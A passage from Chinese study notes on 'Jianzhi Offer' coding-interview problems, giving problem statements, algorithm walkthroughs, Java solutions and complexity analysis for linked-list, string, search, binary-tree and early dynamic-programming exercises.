`head` 为空，直接返回 null\n- **2.初始化：**定义一个哈希表，键为链表的原节点，值为新复制的节点。节点 `cur` 指向头节点 `head`\n- **3.复制链表：**遍历原链表，将复制的节点全部存入哈希表中\n- **4.构建新链表的引用指向：**再次遍历原链表，构建新链表，确定 next 和 random 指针的指向\n- **5.返回值：** 新链表的头节点\n\n```java\nclass Solution {\n    public Node copyRandomList(Node head) {\n      \t// 1. 若头结点为空，直接返回 null\n        if(head == null) return null;\n      \t// 2. 初始化\n        Node cur = head;\n        Map<Node, Node> map = new HashMap<>();\n        // 3. 复制各节点，并建立 “原节点 -> 新节点” 的 Map 映射\n        while(cur != null) {\n            map.put(cur, new Node(cur.val));\n            cur = cur.next;\n        }\n        cur = head;\n        // 4. 构建新链表的 next 和 random 指向\n        while(cur != null) {\n            map.get(cur).next = map.get(cur.next);\n            map.get(cur).random = map.get(cur.random);\n            cur = cur.next;\n        }\n        // 5. 返回新链表的头节点\n        return map.get(head);\n    }\n}\n```\n\n#### 方法2：拼接 + 拆分\n\n**算法流程：**\n\n- 1.复制各节点，构建拼接链表:\n\n设原链表为 node1→node2→⋯ ，构建拼接链表：node1→node1<sub>new</sub> →node2→node2<sub>new</sub> →⋯\n\n- 2.构建新链表各节点的 random 指向：\n\n当访问原节点 `cur` 的随机指向节点 `cur.random` 时，对应新节点 `cur.next` 的随机指向节点为 `cur.random.next` \n\n- 3.拆分原 / 新链表：\n\n设置 `pre/cur` 分别指向原 / 新链表头节点，遍历执行 `pre.next = pre.next.next` 和 `cur.next = cur.next.next` 将两链表拆分开\n\n- 4.返回新链表的头节点 res 即可。\n\n```java\nclass Solution {\n    public Node copyRandomList(Node head) {\n        if(head == null) return null;\n        Node cur = head;\n        // 1. 复制各节点，并构建拼接链表\n        while(cur != null) {\n            Node tmp = new Node(cur.val);\n            tmp.next = cur.next;\n            cur.next = tmp;\n            cur = tmp.next;\n        }\n        // 2. 构建各新节点的 random 指向\n        cur = head;\n        while(cur != null) {\n            if(cur.random != null)\n                cur.next.random = cur.random.next;\n            cur = cur.next.next;\n        }\n        // 3. 拆分两链表\n        cur = head.next;\n        Node pre = head, res = head.next;\n        while(cur.next != null) {\n            pre.next = pre.next.next;\n            cur.next = cur.next.next;\n            pre = pre.next;\n            cur = cur.next;\n        }\n        pre.next = null; // 单独处理原链表尾节点\n        return res;      // 返回新链表头节点\n    }\n}\n```\n\n# 第 3 天 字符串\n\n## 05. 替换空格\n\n### **题目**\n\n> 请实现一个函数，把字符串 `s` 中的每个空格替换成\"%20\"。\n>\n> ```\n> 示例 1：\n> 输入：s = \"We are happy.\"\n> 输出：\"We%20are%20happy.\"\n> ```\n\n###  **解答**\n\n#### 方法1：遍历\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder res = new StringBuilder();\n        for(int i = 0 ; i < s.length(); i++){\n            if(s.charAt(i) == ' '){\n                res.append(\"%20\");\n            }else{\n                res.append(s.charAt(i));\n            }\n        }\n        return res.toString();\n    }\n}\n```\n#### 方法2：替换\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        return s.replace(\" \", \"%20\");\n    }\n}\n```\n\n## 58 - II. 左旋转字符串\n\n### 题目\n\n> 字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。请定义一个函数实现字符串左旋转操作的功能。比如，输入字符串\"abcdefg\"和数字2，该函数将返回左旋转两位得到的结果\"cdefgab\"。\n> ```\n> 示例 1：\n> 输入: s = \"abcdefg\", k = 2\n> 输出: \"cdefgab\"\n> \n> 示例 2：\n> 输入: s = \"lrloseumgh\", k = 6\n> 输出: \"umghlrlose\"\n\n### **解答**\n\n#### 方法1：切片\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        return s.substring(n, s.length()) + s.substring(0, n);\n    }\n}\n```\n\n#### 方法2：遍历\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder res = new StringBuilder();\n\t\tfor(int i = n; i< s.length(); i++){\n            res.append(s.charAt(i));\n        }\n        for(int i = 0; i<n; i++){\n            res.append(s.charAt(i));\n        }\n        return res.toString();\n    }\n}\n```\n\n#### 方法3：利用求余运算\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder res = new StringBuilder();\n        for(int i = n; i < n + s.length(); i++)\n            res.append(s.charAt(i % s.length()));\n        return res.toString();\n    }\n}\n```\n\n# 第 4 天 查找算法(简单)\n\n## 03. 数组中重复的数字\n\n### 题目\n\n> 在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。\n>\n> ```\n> 输入：\n> [2, 3, 1, 0, 2, 5, 3]\n> 输出：2 或 3 \n> ```\n\n### 解答\n\n#### 方法1：哈希表/Set\n\n创建一个 Set ，遍历数组中的每个元素，将该元素加入 Set 中，判断是否添加成功（因为 Set 不允许出现重复元素）\n\n- 如果添加失败，说明该元素已经在集合中，因此该元素是重复元素，返回该元素\n- 反之则没有重复\n\n```java\nclass Solution {\n    public int findRepeatNumber(int[] nums) {\n        Set<Integer> set = new HashSet<>();\n        for (int num : nums) {\n            if (!set.add(num)) {\n                return num;\n            }\n        }\n        return 0;\n    }\n}\n```\n\n#### 方法2：索引匹配\n\n- 由题意可知：长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内\n- 因此每个元素都可以按照其对应的下标进行存取\n- 当其对应的下标被相同的元素占用时，则该元素重复\n\n**算法流程：**\n\n- 遍历数组 nums ，设索引初始值为 i = 0\n\n- 若 nums[i] = i： 说明此数字已在对应索引位置，无需交换，因此跳过\n- 若 nums[nums[i]] = nums[i]： 代表索引 nums[i] 处和索引 i 处的元素值都为 nums[i] ，即找到一组重复值，返回此值 nums[i] \n- 否则： 交换索引为 i 和 nums[i] 的元素值，将此数字交换至对应索引位置\n- 若遍历完毕尚未返回，则返回 -1\n\n![](https://img.jwt1399.top/img/202207282300828.png)\n\n```java\nclass Solution {\n    public int findRepeatNumber(int[] nums) {\n        int i = 0;\n        while(i < nums.length) {\n            //当前元素正好在其所对应的位置上\n            if(nums[i] == i) {\n                i++;\n                continue;\n            }\n            //当前元素所对应的位置的值和当前元素相同，找到重复元素。\n            if(nums[nums[i]] == nums[i]) return nums[i];\n            //交换两个元素，重复循环，继续对当前下标的元素进行下标匹配。\n            int tmp = nums[i];\n            nums[i] = nums[tmp];\n            nums[tmp] = tmp;\n        }\n        return -1;\n    }\n}\n```\n\n## 53 - I. 在排序数组中查找数字 I\n\n### 题目\n\n> 统计一个数字在排序数组中出现的次数。 \n>\n> **示例 1:**\n>\n> ```\n> 输入: nums = [5,7,7,8,8,10], target = 8\n> 输出: 2\n> ```\n>\n> **示例 2:**\n>\n> ```\n> 输入: nums = [5,7,7,8,8,10], target = 6\n> 输出: 0\n> ```\n\n### 解答\n\n```java\nclass Solution {\n    public int search(int[] nums, int target) {\n        int count = 0 ;\n        for(int i = 0; i<nums.length;i++){\n            if(nums[i] == target){\n                count++;\n            }\n        }\n        return count;\n    }\n}\n```\n\n## 53 - II. 0～n-1中缺失的数字\n\n### 题目\n\n> 一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。\n>\n> **示例 1:**\n>\n> ```\n> 输入: [0,1,3]\n> 输出: 2\n> ```\n>\n> **示例 2:**\n>\n> ```\n> 输入: [0,1,2,3,4,5,6,7,9]\n> 输出: 8\n> ```\n\n### 解答\n\n```java\nclass Solution {\n    public int missingNumber(int[] nums) {\n        for(int i = 0; i < nums.length; i++){\n            if (i != nums[i])\n                return i;\n        }\n        return  nums.length;\n    }\n}\n```\n\n# 第 5 天 查找算法(中等)\n\n## 04. 二维数组中的查找\n\n### 题目\n\n> 在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个高效的函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。\n>\n> **示例:**\n>\n> 现有矩阵 matrix 如下：\n>\n> ```\n> [\n>   [1,   4,  7, 11, 15],\n>   [2,   5,  8, 12, 19],\n>   [3,   6,  9, 16, 22],\n>   [10, 13, 14, 17, 24],\n>   [18, 21, 23, 26, 30]\n> ]\n> ```\n>\n> 给定 target = `5`，返回 `true`。\n>\n> 给定 target = `20`，返回 `false`。\n\n###  解答\n\n算法流程：\n\n- 从矩阵 matrix 左下角元素（索引设为 (i, j) ）开始遍历，并与目标值对比：\n  - 当 `matrix[i][j] > target` 时，则 `target` 在该行的上方，执行 `i--`，即消去该行元素；\n  - 当 `matrix[i][j] < target` 时，则 `target` 在该行的右方，执行 `j++`，即消去该列元素；\n  - 当 `matrix[i][j] = target` 时，返回 true，代表找到目标值。\n- 若行索引或列索引越界，则代表矩阵中无目标值，返回 false。\n\n```java\nclass Solution {\n    public boolean findNumberIn2DArray(int[][] matrix, int target) {\n        int i = matrix.length - 1, j = 0;\n        while(i >= 0 && j < matrix[0].length){\n            if(matrix[i][j] > target) i--;\n            else if (matrix[i][j] < target) j++;\n            else return true;\n        }\n        return false;\n    }\n}\n```\n\n### 复杂度\n\n- 时间复杂度： O(M+N)\n  - M 和 N 分别为矩阵行数和列数，此算法最多循环 M+N 次。\n\n- 空间复杂度： O(1)\n  -  i， j 指针使用常数大小额外空间。\n\n## 11. 旋转数组的最小数字\n\n### 题目\n\n> 把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。\n>\n> 给你一个可能存在 **重复** 元素值的数组 `numbers` ，它原来是一个升序排列的数组，并按上述情形进行了一次旋转。请返回旋转数组的**最小元素**。例如，数组 `[3,4,5,1,2]` 为 `[1,2,3,4,5]` 的一次旋转，该数组的最小值为 1。 \n>\n> 注意，数组 `[a[0], a[1], a[2], ..., a[n-1]]` 旋转一次 的结果为数组 `[a[n-1], a[0], a[1], a[2], ..., a[n-2]]` 。\n>\n> **示例 1：**\n>\n> ```\n> 输入：numbers = [3,4,5,1,2]\n> 输出：1\n> ```\n>\n> **示例 2：**\n>\n> ```\n> 输入：numbers = [2,2,2,0,1]\n> 输出：0\n> ```\n\n### 解答\n\n算法流程：\n\n- 初始化： 声明 low，high 双指针分别指向 numbers 数组左右两端；\n- 循环二分： 设 pivot = (low + high) / 2 为每次二分的中点（ \"/\" 代表向下取整除法），可分为以下三种情况：\n  - 当 nums[pivot] > nums[high] 时： 旋转点 x 一定在 [pivot + 1, high] 闭区间内，因此执行 low = pivot + 1；\n  - 当 nums[pivot] < nums[high] 时： 旋转点 x 一定在 [low, pivot] 闭区间内，因此执行 high = pivot；\n  - 当 nums[pivot] = nums[high] 时： 无法判断 pivot 在哪个排序数组中，即无法判断旋转点 x 在 [low, pivot] 还是 [pivot + 1, high] 区间中。解决方案： 执行 high = high - 1 缩小判断范围，分析见下文。\n- 返回值： 当 low = high 时跳出二分循环，并返回旋转点的值 nums[low] 即可。\n\n```java\nclass Solution {\n    public int minArray(int[] numbers) {\n        int low = 0;\n        int high = numbers.length - 1;\n        while (low < high) {\n            // int pivot = (low + high) / 2;\n            int pivot = low + (high - low) / 2; //防止low + high造成整型越界\n            if (numbers[pivot] < numbers[high]) {\n                high = pivot;\n            } else if (numbers[pivot] > numbers[high]) {\n                low = pivot + 1;\n            } else {\n                high -= 1;\n            }\n        }\n        return numbers[low];\n    }\n}\n```\n\n### 复杂度\n\n- 时间复杂度：O(log<sub>n</sub>)\n\n- 空间复杂度：O(1)\n\n## 50. 第一个只出现一次的字符\n\n### 题目\n\n> 在字符串 s 中找出第一个只出现一次的字符。如果没有，返回一个单空格。 s 只包含小写字母。\n>\n> **示例 1:**\n>\n> ```\n> 输入：s = \"abaccdeff\"\n> 输出：'b'\n> ```\n>\n> **示例 2:**\n>\n> ```\n> 输入：s = \"\" \n> 输出：' '\n> ```\n\n### 解答\n\n#### 方法1：哈希表/Map\n\n1. 遍历字符串 `s` ，使用哈希表统计各字符出现次数。\n2. 再遍历字符串 `s` ，在哈希表中找到首个 “数量为 1 的字符”，并返回。\n\n```java\nclass Solution {\n    public char firstUniqChar(String s) {\n        HashMap<Character,Integer> map = new HashMap<>();\n        char[] S = s.toCharArray();\n        for(char i : S)\n            map.put(i,map.getOrDefault(i,0)+1);\n        for (char i : S)\n            if(map.get(i)==1)\n                return i;\n        return ' ';\n    }\n}\n```\n\n#### 方法2：有序哈希表\n\n在哈希表的基础上，有序哈希表中的键值对是 **按照插入顺序排序** 的。基于此，可通过遍历有序哈希表，实现搜索首个 “数量为 1 的字符”。\n\n```java\nclass Solution {\n    public char firstUniqChar(String s) {\n        Map<Character, Integer> map = new LinkedHashMap<>();\n        char[] S = s.toCharArray();\n        for(char i : S)\n            map.put(i,map.getOrDefault(i,0)+1);\n        for(Map.Entry<Character, Integer> d : map.entrySet()){\n           if(d.getValue()==1) \n             return d.getKey();\n        }\n        return ' ';\n    }\n}\n```\n\n### 复杂度\n\n方法1:\n\n- 时间复杂度：O(n)，其中 n 是字符串 s 的长度。\n\n- 空间复杂度：O(1)， s 只包含小写字母，因此最多有 26 个不同字符，HashMap 存储需占用 O(26) = O(1) 的额外空间。\n\n方法2:\n\n时间和空间复杂度均与 “方法1” 相同，而具体分析：方法 1 需遍历 s 两轮；方法 2 遍历 s 一轮，遍历 map                 一轮（ map 的长度不大于 26 ）。\n\n# 第6天 搜索与回溯算法（简单）\n\n##  32 - I. 从上到下打印二叉树\n\n### 题目\n\n>从上到下打印出二叉树的每个节点，同一层的节点按照从左到右的顺序打印。\n>\n>例如:\n>给定二叉树: [3,9,20,null,null,15,7],\n>\n>        3\n>       / \\\n>      9  20\n>        /  \\\n>       15   7\n>\n>\n>返回：\n>\n>[3,9,20,15,7]\n\n### 解答\n\n算法流程：\n\n- 特例处理： 当树的根节点为空，则直接返回空列表 [] ；\n- 初始化： 结果列表 res = [] ，包含根节点的队列 queue = [root] ；\n- BFS 循环： 当队列 queue 为空时跳出；\n  - 出队： 队首元素出队，记为 node；\n  - 打印： 将 node.val 添加至列表 tmp 尾部；\n  - 添加子节点： 若 node 的左（右）子节点不为空，则将左（右）子节点加入队列 queue ；\n- 返回值： 返回打印结果列表 res 即可。\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public int[] levelOrder(TreeNode root) {\n        if(root == null) return new int[0];// 空树则返回空数组\n        Queue<TreeNode> queue = new LinkedList<>();// 借助一个队列，通过 BFS 实现按层遍历二叉树\n        queue.add(root);// 根结点先入队\n        ArrayList<Integer> tmp = new ArrayList<>();// 申请一个动态数组 ArrayList 动态添加节点值\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();// 取出当前队首元素\n            tmp.add(node.val);\n            if(node.left != null) queue.add(node.left);// 左子节点入队\n            if(node.right != null) queue.add(node.right);// 右子节点入队\n        }\n     \t\t// 将 ArrayList 转为 int 数组并返回\n        int[] res = new int[tmp.size()];\n        for(int i = 0; i < res.length; i++)\n          res[i] = tmp.get(i);\n        return res;  \n    }\n}\n```\n\n### 复杂度\n\n- 时间复杂度 O(N) ： N 为二叉树的节点数量，即 BFS 需循环 N 次。\n- 空间复杂度 O(N)： 最差情况下，即当树为平衡二叉树时，最多有 N/2 个树节点同时在 queue 中，使用 O(N) 大小的额外空间。\n\n## 32 - II. 从上到下打印二叉树 II\n\n### 题目\n\n> 从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。\n>\n> 例如:\n> 给定二叉树: [3,9,20,null,null,15,7],\n>\n>         3\n>        / \\\n>       9  20\n>         /  \\\n>        15   7\n>\n> 返回其层次遍历结果：\n>\n> ```\n> [\n>   [3],\n>   [9,20],\n>   [15,7]\n> ]\n> ```\n\n### 解答\n\n算法流程：\n\n- 特例处理： 当根节点为空，则返回空列表 [] ；\n- 初始化： 打印结果列表 res = [] ，包含根节点的队列 queue = [root] ；\n- BFS 循环： 当队列 queue 为空时跳出；\n  - 新建一个临时列表 tmp ，用于存储当前层打印结果；\n  - 当前层打印循环： 循环次数为当前层节点数（即队列 queue 长度）；\n    - 出队： 队首元素出队，记为 node；\n    - 打印： 将 node.val 添加至 tmp 尾部；\n    - 添加子节点： 若 node 的左（右）子节点不为空，则将左（右）子节点加入队列 queue ；\n  - 将当前层结果 tmp 添加入 res 。\n- 返回值： 返回打印结果列表 res 即可。\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.add(root);\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        while(!queue.isEmpty()) {\n            List<Integer> tmp = new ArrayList<>();\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                tmp.add(node.val);\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n- 时间复杂度 O(N)： N 为二叉树的节点数量，即 BFS 需循环 N 次。\n- 空间复杂度 O(N) ： 最差情况下，即当树为平衡二叉树时，最多有 N/2 个树节点同时在 queue 中，使用 O(N) 大小的额外空间。\n\n## 32 - III. 从上到下打印二叉树 III\n\n### 题目\n\n> 请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。\n>\n> 例如:\n> 给定二叉树: [3,9,20,null,null,15,7],\n>\n>         3\n>        / \\\n>       9  20\n>         /  \\\n>        15   7\n>\n> 返回其层次遍历结果：\n>\n> ```\n> [\n>   [3],\n>   [20,9],\n>   [15,7]\n> ]\n> ```\n\n### 解答\n\n#### 方法1：层序遍历 + 双端队列\n\n利用双端队列的两端皆可添加元素的特性，设打印列表（双端队列） tmp ，并规定：\n\n- 奇数层 则添加至 tmp 尾部 ，\n- 偶数层 则添加至 tmp 头部 。\n\n算法流程：\n\n- 特例处理： 当树的根节点为空，则直接返回空列表 [] ；\n- 初始化： 打印结果空列表 res ，包含根节点的队列 queue ；\n- BFS 循环： 当 queue 为空时跳出；\n  - 新建双端队列 tmp ，用于临时存储当前层打印结果；\n  - 当前层打印循环： 循环次数为当前层节点数（即 queue 长度）；\n    - 出队： 队首元素出队，记为 node；\n    - 打印： 若为奇数层，将 node.val 添加至 tmp 尾部；否则，添加至 tmp 头部\n    - 添加子节点： 若 node 的左（右）子节点不为空，则加入 queue ；\n  - 将当前层结果 tmp 添加入 res 。\n- 返回值： 返回打印结果列表 res 即可；\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.add(root);\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        while(!queue.isEmpty()) {\n            LinkedList<Integer> tmp = new LinkedList<>();//实现双端队列\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                if(res.size() % 2 == 0) tmp.addLast(node.val); // 奇数层，添加元素至队列尾部\n                else tmp.addFirst(node.val); // 偶数层，添加元素只队列头部\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n#### 方法2：层序遍历 + 倒序\n\n**偶数层倒序：** 若 `res` 的长度为 **奇数** ，说明当前是偶数层，则对 `tmp` 执行 **倒序** 操作。\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        List<List<Integer>> res = new ArrayList<>();\n        if(root != null) queue.add(root);\n        while(!queue.isEmpty()) {\n            List<Integer> tmp = new ArrayList<>();\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                tmp.add(node.val);\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            if(res.size() % 2 == 1) Collections.reverse(tmp);\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n\n\n### 复杂度\n\n#### 方法1\n\n- 时间复杂度 O(N)： N 为二叉树的节点数量，即 BFS 需循环 N 次，占用 O(N)；\n\n  双端队列的队首和队尾的添加和删除操作的时间复杂度均为 O(1)。\n\n- 空间复杂度 O(N) ： 最差情况下，即当树为满二叉树时，最多有N/2 个树节点 同时 在 queue 中，使用 O(N) 大小的额外空间。\n\n#### 方法2\n\n- 时间复杂度 O(N)： N 为二叉树的节点数量，即 BFS 需循环 N 次，占用 O(N)。\n\n  共完成少于 N 个节点的倒序操作，占用 O(N)。\n\n- 空间复杂度 O(N) ： 最差情况下，即当树为满二叉树时，最多有 N/2 个树节点同时在 queue 中，使用 O(N) 大小的额外空间。\n\n# 第 7 天 搜索与回溯算法（简单）\n\n## 26.树的子结构\n\n### 题目\n\n>输入两棵二叉树A和B，判断B是不是A的子结构。(约定空树不是任意一个树的子结构)\n>\n>B是A的子结构， 即 A中有出现和B相同的结构和节点值。\n>\n>例如:\n>给定的树 A:\n>\n>         3\n>        / \\\n>       4   5\n>      / \\\n>     1   2\n>\n>给定的树 B：\n>\n>```\n>   4 \n>  /\n> 1\n>```\n>\n>返回 true，因为 B 与 A 的一个子树拥有相同的结构和节点值。\n>\n>示例 1：\n>\n>```\n>输入：A = [1,2,3], B = [3,1]\n>输出：false\n>```\n>\n>示例 2：\n>\n>```\n>输入：A = [3,4,5,1,2], B = [4,1]\n>输出：true\n>```\n\n### 解答\n\n算法流程：\n\n**`recur(A, B)` 函数：**\n\n1.  **终止条件：**\n    1.  当节点 B 为空：说明树 B 已匹配完成（越过叶子节点），因此返回 true ；\n    2.  当节点 A 为空：说明已经越过树 A 叶子节点，即匹配失败，返回 false ；\n    3.  当节点 A 和 B 的值不同：说明匹配失败，返回 false ；\n2.  **返回值：**\n    1.  判断 A和 B 的**左**子节点是否相等，即 `recur(A.left, B.left)` ；\n    2.  判断 A 和 B 的**右**子节点是否相等，即 `recur(A.right, B.right)` ；\n\n**`isSubStructure(A, B)` 函数：**\n\n1.  **特例处理：** 当 树 A 为空 **或** 树 B 为空 时，直接返回 false ；\n2.  **返回值：** 若树 B 是树 A 的子结构，则必满足以下三种情况之一，因此用或 `||` 连接；\n    1.  以 **节点 A 为根节点的子树** 包含树 B ，对应 `recur(A, B)`；\n    2.  树 B 是 **树 A 左子树** 的子结构，对应 `isSubStructure(A.left, B)`；\n    3.  树 B 是 **树 A 右子树** 的子结构，对应 `isSubStructure(A.right, B)`；\n\n![](https://img.jwt1399.top/img/202208141004156.png)\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public boolean isSubStructure(TreeNode A, TreeNode B) {\n        // 若A与B其中一个为空,立即返回false\n        if(A == null || B == null) {\n            return false;\n        }\n        // B为A的子结构有3种情况,满足任意一种即可:\n        // 1.B的子结构起点为A的根节点,此时结果为recur(A,B)\n        // 2.B的子结构起点隐藏在A的左子树中,而不是直接为A的根节点,此时结果为isSubStructure(A.left, B)\n        // 3.B的子结构起点隐藏在A的右子树中,此时结果为isSubStructure(A.right, B)\n        return recur(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);\n    }\n\n    /*\n    判断B是否为A的子结构,其中B子结构的起点为A的根节点\n    */\n    private boolean recur(TreeNode A, TreeNode B) {\n        // 若B走完了,说明查找完毕,B为A的子结构\n        if(B == null) {\n            return true;\n        }\n        // 若B不为空并且A为空或者A与B的值不相等,直接可以判断B不是A的子结构\n        if(A == null || A.val != B.val) {\n            return false;\n        }\n        // 当A与B当前节点值相等,若要判断B为A的子结构\n        // 还需要判断B的左子树是否为A左子树的子结构 && B的右子树是否为A右子树的子结构\n        // 若两者都满足就说明B是A的子结构,并且该子结构以A根节点为起点\n        return recur(A.left, B.left) && recur(A.right, B.right);\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(MN)：** 其中 M,N 分别为树 A 和 树 B 的节点数量；先序遍历树 A 占用 O(M) ，每次调用 `recur(A, B)` 判断占用 O(N)。\n-   **空间复杂度 O(M)：** 当树 A 和树 B 都退化为链表时，递归调用深度最大。当 M ≤ N 时，遍历树 A 与递归判断的总递归深度为 M ；当 M \\> N 时，最差情况为遍历至树 A 叶子节点，此时总递归深度为 M。\n\n## 27.二叉树的镜像\n\n### 题目\n\n>请完成一个函数，输入一个二叉树，该函数输出它的镜像。\n>\n>例如输入：\n>\n>         4\n>       /   \\\n>      2     7\n>     / \\   / \\\n>    1   3 6   9\n>\n>镜像输出：\n>\n>         4\n>       /   \\\n>      7     2\n>     / \\   / \\\n>    9   6 3   1\n>示例 1：\n>\n>```\n>输入：root = [4,2,7,1,3,6,9]\n>输出：[4,7,2,9,6,3,1]\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208131818608.png)\n\n#### 方法1：递归法\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public TreeNode mirrorTree(TreeNode root) {\n        if(root == null) return null;\n        //从上到下直接交换左右子树\n        TreeNode tmp = root.left;\n        root.left = root.right;\n        root.right = tmp;\n        \n        mirrorTree(root.left);\n        mirrorTree(root.right);\n        return root;\n    }\n}\n```\n\n#### 方法2：辅助栈\n\n算法流程：\n\n- 特例处理： 当 root 为空时，直接返回 null；\n- 初始化： 栈，并加入根节点 root。\n- 循环交换： 当栈 stack 为空时跳出；\n  - 出栈： 记为 node ；\n  - 添加子节点： 将 node 左和右子节点入栈；\n  - 交换： 交换 node 的左 / 右子节点。\n- 返回值： 返回根节点 root 。\n\n```java\nclass Solution {\n    public TreeNode mirrorTree(TreeNode root) {\n        if(root == null) return null;\n        Stack<TreeNode> stack = new Stack<>();\n      \tstack.add(root); \n        while(!stack.isEmpty()) {\n            TreeNode node = stack.pop();\n            if(node.left != null) stack.add(node.left);\n            if(node.right != null) stack.add(node.right);\n            TreeNode tmp = node.left;\n            node.left = node.right;\n            node.right = tmp;\n        }\n        return root;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n- 时间复杂度 O(N)： 其中 N 为二叉树的节点数量，建立二叉树镜像需要遍历树的所有节点，占用 O(N) 时间。\n- 空间复杂度 O(N)： 最差情况下（当二叉树退化为链表），递归时系统需使用 O(N) 大小的栈空间。\n\n#### 方法2\n\n- 时间复杂度 O(N) ： 其中 N 为二叉树的节点数量，建立二叉树镜像需要遍历树的所有节点，占用 O(N) 时间。\n- 空间复杂度 O(N) ： 最差情况下，栈 stack 最多同时存储 N+1/2个节点，占用 O(N) 额外空间。\n\n## 28.对称的二叉树\n\n### 题目\n\n>请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。\n>\n>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。\n>\n>        1\n>       / \\\n>      2   2\n>     / \\ / \\\n>    3  4 4  3\n>\n>但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:\n>\n>        1\n>       / \\\n>      2   2\n>       \\   \\\n>       3    3\n>示例 1：\n>\n>```\n>输入：root = [1,2,2,3,4,4,3]\n>输出：true\n>```\n>\n>示例 2：\n>\n>```\n>输入：root = [1,2,2,null,3,null,3]\n>输出：false\n>```\n\n### 解答\n\n对称二叉树定义： 对于树中 任意两个对称节点 L 和 R ，一定有：\n\n- L.val = R.val： 即此两对称节点值相等。\n- L.left.val = R.right.val：即 L 的左子节点和 R 的右子节点对称；\n- L.right.val = R.left.val ：即 L 的右子节点和 R 的左子节点对称。\n\n根据以上规律，考虑从顶至底递归，判断每对节点是否对称，从而判断树是否为对称二叉树。\n\n![](https://img.jwt1399.top/img/202208131908122.png)\n\n算法流程：\n`isSymmetric(root)` ：\n\n- 特例处理： 若根节点 root 为空，则直接返回 true 。\n- 返回值： 即 isSame(root.left, root.right) ;\n\n`isSame(L, R)` ：\n\n- 终止条件：\n  - 当 L 和 R 同时越过叶节点： 此树从顶至底的节点都对称，因此返回 true ；\n  - 当 L 或 R 中只有一个越过叶节点： 此树不对称，因此返回 false ；\n  - 当节点 L 值 不等于节点 R 值： 此树不对称，因此返回 false ；\n- 递推工作：\n  - 判断两节点 L.left 和 R.right 是否对称，即 `isSame(L.left, R.right)` \n  - 判断两节点 L.right 和 R.left 是否对称，即 `isSame(L.right, R.left)` \n- 返回值： 两对节点都对称时，才是对称树，因此用与逻辑符 && 连接。\n\n```java\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        return root == null ? true : isSame(root.left, root.right);\n    }\n    boolean isSame(TreeNode L, TreeNode R) {\n        if(L == null && R == null) return true;\n        if(L == null || R == null || L.val != R.val) return false;\n        return isSame(L.left, R.right) && isSame(L.right, R.left);\n    }\n}\n```\n\n### 复杂度\n\n复杂度分析：\n\n- 时间复杂度 O(N) ： 其中 N 为二叉树的节点数量，每次执行 isSame() 可以判断一对节点是否对称，因此最多调用 N/2 次 isSame() 方法。\n- 空间复杂度 O(N)： 最差情况下，二叉树退化为链表，系统使用 O(N) 大小的栈空间。\n\n# 第 8 天 动态规划（简单）\n\n## 10- I. 斐波那契数列\n\n### 题目\n\n>写一个函数，输入 `n` ，求斐波那契（Fibonacci）数列的第 `n` 项（即 